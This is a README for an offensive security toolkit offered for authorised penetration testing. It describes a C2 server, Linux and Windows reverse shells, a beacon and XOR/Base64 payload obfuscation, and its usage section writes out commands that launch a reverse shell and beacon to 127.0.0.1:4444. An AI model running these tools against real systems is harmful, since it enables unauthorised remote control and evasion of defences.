RedTeam Utils is a collection of offensive security utilities designed for red team engagements and penetration testing.
It provides tools for Command & Control (C2), reverse shells, beacons, and payload obfuscation.

⚠️ Disclaimer: This project is for educational and authorized penetration testing purposes only.
Do not use it on systems you do not own or do not have explicit permission to test.

##Features

C2 Server

Execute remote commands on compromised systems.

Interactive shell over TCP.

Reverse Shell

Connects back to C2 for remote command execution.

Supports Linux & Windows.

Beacon

Periodic check-ins with configurable interval.

Logs all beacon activity to outputs/beacon_log.txt.

Obfuscation

Encode payloads with Base64.

XOR encoding for simple evasion.

Custom string replacement.

#Installation
git clone https://github.com/<alishams11>/redteam-utils.git
cd redteam-utils
pip install -r requirements.txt

#Usage
Start C2 Server
python3 main.py --c2 4444

Launch Reverse Shell
python3 main.py --reverse 127.0.0.1 4444

Start Beacon (interval = 5 seconds)
python3 main.py --beacon 127.0.0.1 4444 5

Obfuscate a Payload
python3 main.py --encode base64
python3 main.py --encode xor
python3 main.py --encode base64 xor

Example
C2 Session with Reverse Shell
screenshots/demo.png

#Roadmap

🔹 Add encryption for C2 communication.

🔹 Add stealth techniques for beacon.

🔹 Improve payload obfuscation with polymorphic encoding.

